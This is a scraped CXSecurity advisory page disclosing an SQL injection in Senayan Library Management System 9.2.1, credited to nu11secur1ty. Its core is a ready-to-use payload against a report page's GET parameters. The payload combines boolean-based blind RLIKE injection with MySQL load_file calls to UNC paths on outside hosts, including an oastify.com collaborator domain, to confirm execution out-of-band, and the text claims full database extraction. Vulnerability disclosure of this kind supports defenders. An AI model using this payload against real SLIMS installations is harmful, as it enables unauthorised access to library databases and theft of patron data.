---
title: Senayan Library Management System 9.2.1 SQL Injection
url: https://cxsecurity.com/issue/WLB-2022120040
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-22
fetch_date: 2025-10-04T02:11:54.362245
---

# Senayan Library Management System 9.2.1 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Senayan Library Management System 9.2.1 SQL Injection** **2022.12.21**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

## Title: Senayan Library Management System v9.2.1 a.k.a SLIMS 9 SQLi
## Author: nu11secur1ty
## Date: 12.20.2022
## Vendor: https://slims.web.id/web/
## Software: https://github.com/slims/slims9\_bulian/releases/tag/v9.2.1
## Reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.2.1/SQLi
## Description:
The manual insertion `point 4` appears to be vulnerable to SQL
injection attacks. The payload '+(select
load\_file('\\\\azditm561h7fku3yj99us8ne258zwpkgn4eu1opd.stupid.com\\dzd'))+'
was submitted in the manual insertion `point 4`.
This payload injects a SQL sub-query that calls MySQL's load\_file
function with a UNC file path that references a URL on an external
domain.
The application interacted with that domain, indicating that the
injected SQL query was executed.
The attacker can take information from all database columns of this
system by using this vulnerability.
## STATUS: HIGH Vulnerability - CRITICAL
[+] Payload:
```MySQL
---
Parameter: class (GET)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY
or GROUP BY clause
Payload: reportView=true&year=2002&class=bbbb'+(select
load\_file('\\\\716gb1cfe9gkja4zdj45qxx9208vwlkcn0en6bv.slims.web.id\\nbq'))+''
RLIKE (SELECT (CASE WHEN (5179=5179) THEN 0x62626262+(select
load\_file(0x5c5c5c5c37313667623163666539676b6a61347a646a34357178783932303876776c6b636e30656e3662762e736c696d732e7765622e69645c5c6e6271))+''
ELSE 0x28 END)) AND 'BcGE'='BcGE&membershipType=a'''+(select
load\_file('\\\\c0dsife82nybqm59yrpe81r86zct0kobrzip5it7.oastify.com\\bjr'))+'&collType=aaaa'+(select
load\_file('\\\\dctiy0hziwzd4xujfqqcfd3uul0koac1fp6ft9hy.slims.web.id\\wtf'))+''+(select
load\_file('\\\\azditm561h7fku3yj99us8ne258zwpkgn4eu1opd.slims.web.id\\dzd'))+'
---
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.2.1/SQLi)
## Proof and Exploit:
[href](https://streamable.com/zp75bx)
## Time spent
`00:15:00`
## Writing an exploit
`00:05:00`

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120040)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top